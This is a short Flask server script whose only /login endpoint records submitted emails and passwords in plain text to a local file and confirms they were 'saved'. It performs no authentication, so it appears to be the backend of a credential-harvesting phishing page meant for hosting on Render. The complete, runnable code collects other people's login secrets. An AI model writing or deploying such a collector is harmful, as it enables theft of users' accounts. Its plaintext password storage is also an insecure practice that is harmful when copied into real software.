from flask import Flask, request
import os

app = Flask(__name__)

# Ensure the data folder exists
if not os.path.exists("data"):
    os.makedirs("data")


@app.route("/login", methods=["POST"])
def login():
    email = request.form.get("email")
    password = request.form.get("password")

    # Save to a file inside the project
    file_path = "data/logins.txt"
    with open(file_path, "a") as file:
        file.write(f"Email: {email}\nPassword: {password}\n\n")

    return "Login credentials saved successfully!", 200


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)  # Use port 10000 for Render
